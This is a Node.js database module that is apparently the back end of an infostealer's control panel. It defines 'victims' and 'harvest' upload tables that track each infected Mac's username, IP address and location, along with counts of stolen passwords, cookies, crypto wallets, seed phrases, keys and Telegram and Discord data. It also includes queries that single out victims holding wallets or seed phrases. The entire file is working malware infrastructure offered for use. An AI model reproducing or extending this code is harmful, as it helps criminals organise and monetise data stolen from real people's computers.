"use strict";

const Database = require("better-sqlite3");
const path = require("path");
const fs = require("fs");

function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function openDb(dataDir) {
  ensureDir(dataDir);
  const dbPath = path.join(dataDir, "panel.db");
  const db = new Database(dbPath);
  db.pragma("journal_mode = WAL");
  db.pragma("foreign_keys = ON");

  db.exec(`
    CREATE TABLE IF NOT EXISTS victims (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      hostname TEXT NOT NULL,
      os TEXT,
      arch TEXT,
      mac_username TEXT,
      ip_address TEXT,
      country TEXT,
      country_code TEXT,
      city TEXT,
      has_wallet INTEGER NOT NULL DEFAULT 0,
      has_seeds INTEGER NOT NULL DEFAULT 0,
      has_telegram INTEGER NOT NULL DEFAULT 0,
      has_discord INTEGER NOT NULL DEFAULT 0,
      has_keys INTEGER NOT NULL DEFAULT 0,
      has_gaming INTEGER NOT NULL DEFAULT 0,
      has_vpn INTEGER NOT NULL DEFAULT 0,
      password_count INTEGER NOT NULL DEFAULT 0,
      cookie_count INTEGER NOT NULL DEFAULT 0,
      wallet_count INTEGER NOT NULL DEFAULT 0,
      extension_count INTEGER NOT NULL DEFAULT 0,
      seed_count INTEGER NOT NULL DEFAULT 0,
      key_count INTEGER NOT NULL DEFAULT 0,
      telegram_count INTEGER NOT NULL DEFAULT 0,
      candidate_count INTEGER NOT NULL DEFAULT 0,
      gaming_count INTEGER NOT NULL DEFAULT 0,
      vpn_count INTEGER NOT NULL DEFAULT 0,
      upload_count INTEGER NOT NULL DEFAULT 0,
      first_seen TEXT NOT NULL,
      last_seen TEXT NOT NULL,
      stats_json TEXT,
      UNIQUE(hostname, arch)
    );

    CREATE TABLE IF NOT EXISTS uploads (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      victim_id INTEGER NOT NULL,
      phase TEXT NOT NULL DEFAULT 'harvest',
      title TEXT,
      summary TEXT,
      filename TEXT NOT NULL,
      file_path TEXT NOT NULL,
      file_size INTEGER NOT NULL DEFAULT 0,
      part_num INTEGER NOT NULL DEFAULT 1,
      part_total INTEGER NOT NULL DEFAULT 1,
      ip_address TEXT,
      country TEXT,
      country_code TEXT,
      city TEXT,
      uploaded_at TEXT NOT NULL,
      FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_victims_last_seen ON victims(last_seen DESC);
    CREATE INDEX IF NOT EXISTS idx_victims_country ON victims(country_code);
    CREATE INDEX IF NOT EXISTS idx_uploads_victim ON uploads(victim_id);
    CREATE INDEX IF NOT EXISTS idx_uploads_uploaded_at ON uploads(uploaded_at DESC);
  `);

  return db;
}

function nowIso() {
  return new Date().toISOString();
}

function upsertVictim(db, row) {
  const ts = nowIso();
  const existing = db.prepare(
    "SELECT id FROM victims WHERE hostname = ? AND arch = ?"
  ).get(row.hostname, row.arch || "mac");

  if (existing) {
    db.prepare(`
      UPDATE victims SET
        os = COALESCE(?, os),
        mac_username = COALESCE(?, mac_username),
        ip_address = COALESCE(?, ip_address),
        country = COALESCE(?, country),
        country_code = COALESCE(?, country_code),
        city = COALESCE(?, city),
        has_wallet = MAX(has_wallet, ?),
        has_seeds = MAX(has_seeds, ?),
        has_telegram = MAX(has_telegram, ?),
        has_discord = MAX(has_discord, ?),
        has_keys = MAX(has_keys, ?),
        has_gaming = MAX(has_gaming, ?),
        has_vpn = MAX(has_vpn, ?),
        password_count = MAX(password_count, ?),
        cookie_count = MAX(cookie_count, ?),
        wallet_count = MAX(wallet_count, ?),
        extension_count = MAX(extension_count, ?),
        seed_count = MAX(seed_count, ?),
        key_count = MAX(key_count, ?),
        telegram_count = MAX(telegram_count, ?),
        candidate_count = MAX(candidate_count, ?),
        gaming_count = MAX(gaming_count, ?),
        vpn_count = MAX(vpn_count, ?),
        upload_count = upload_count + 1,
        last_seen = ?,
        stats_json = COALESCE(?, stats_json)
      WHERE id = ?
    `).run(
      row.os, row.mac_username, row.ip_address, row.country, row.country_code, row.city,
      row.has_wallet, row.has_seeds, row.has_telegram, row.has_discord,
      row.has_keys, row.has_gaming, row.has_vpn,
      row.password_count, row.cookie_count, row.wallet_count, row.extension_count,
      row.seed_count, row.key_count, row.telegram_count, row.candidate_count,
      row.gaming_count, row.vpn_count,
      ts, row.stats_json, existing.id
    );
    return existing.id;
  }

  const info = db.prepare(`
    INSERT INTO victims (
      hostname, os, arch, mac_username, ip_address, country, country_code, city,
      has_wallet, has_seeds, has_telegram, has_discord, has_keys, has_gaming, has_vpn,
      password_count, cookie_count, wallet_count, extension_count, seed_count, key_count,
      telegram_count, candidate_count, gaming_count, vpn_count, upload_count,
      first_seen, last_seen, stats_json
    ) VALUES (
      ?, ?, ?, ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?, ?, ?,
      ?, ?, ?, ?, ?, ?,
      ?, ?, ?, ?, 1,
      ?, ?, ?
    )
  `).run(
    row.hostname, row.os || "darwin", row.arch || "mac", row.mac_username,
    row.ip_address, row.country, row.country_code, row.city,
    row.has_wallet, row.has_seeds, row.has_telegram, row.has_discord,
    row.has_keys, row.has_gaming, row.has_vpn,
    row.password_count, row.cookie_count, row.wallet_count, row.extension_count,
    row.seed_count, row.key_count, row.telegram_count, row.candidate_count,
    row.gaming_count, row.vpn_count,
    ts, ts, row.stats_json
  );
  return Number(info.lastInsertRowid);
}

function insertUpload(db, row) {
  const info = db.prepare(`
    INSERT INTO uploads (
      victim_id, phase, title, summary, filename, file_path, file_size,
      part_num, part_total, ip_address, country, country_code, city, uploaded_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    row.victim_id, row.phase, row.title, row.summary, row.filename, row.file_path,
    row.file_size, row.part_num, row.part_total, row.ip_address,
    row.country, row.country_code, row.city, nowIso()
  );
  return Number(info.lastInsertRowid);
}

function listVictims(db, filters = {}) {
  const clauses = [];
  const params = [];

  if (filters.country) {
    clauses.push("country_code = ?");
    params.push(filters.country);
  }
  if (filters.has_wallet === "1" || filters.has_wallet === "true") {
    clauses.push("has_wallet = 1");
  }
  if (filters.has_wallet === "0" || filters.has_wallet === "false") {
    clauses.push("has_wallet = 0");
  }
  if (filters.has_seeds === "1" || filters.has_seeds === "true") {
    clauses.push("has_seeds = 1");
  }
  if (filters.q) {
    clauses.push("(hostname LIKE ? OR mac_username LIKE ? OR ip_address LIKE ?)");
    const like = `%${filters.q}%`;
    params.push(like, like, like);
  }

  const where = clauses.length ? `WHERE ${clauses.join(" AND ")}` : "";
  const sort = filters.sort === "oldest" ? "last_seen ASC" : "last_seen DESC";
  const limit = Math.min(Math.max(parseInt(filters.limit, 10) || 200, 1), 1000);

  return db.prepare(`
    SELECT * FROM victims ${where} ORDER BY ${sort} LIMIT ${limit}
  `).all(...params);
}

function getVictim(db, id) {
  return db.prepare("SELECT * FROM victims WHERE id = ?").get(id);
}

function listUploadsForVictim(db, victimId) {
  return db.prepare(
    "SELECT * FROM uploads WHERE victim_id = ? ORDER BY uploaded_at DESC"
  ).all(victimId);
}

function getUpload(db, id) {
  return db.prepare("SELECT * FROM uploads WHERE id = ?").get(id);
}

function getStats(db) {
  return db.prepare(`
    SELECT
      (SELECT COUNT(*) FROM victims) AS victims,
      (SELECT COUNT(*) FROM uploads) AS uploads,
      (SELECT COUNT(*) FROM victims WHERE has_wallet = 1) AS with_wallet,
      (SELECT COUNT(*) FROM victims WHERE has_seeds = 1) AS with_seeds,
      (SELECT COUNT(DISTINCT country_code) FROM victims WHERE country_code IS NOT NULL AND country_code != '') AS countries
  `).get();
}

function listCountries(db) {
  return db.prepare(`
    SELECT country_code, country, COUNT(*) AS count
    FROM victims
    WHERE country_code IS NOT NULL AND country_code != ''
    GROUP BY country_code, country
    ORDER BY count DESC
  `).all();
}

module.exports = {
  ensureDir,
  openDb,
  upsertVictim,
  insertUpload,
  listVictims,
  getVictim,
  listUploadsForVictim,
  getUpload,
  getStats,
  listCountries,
};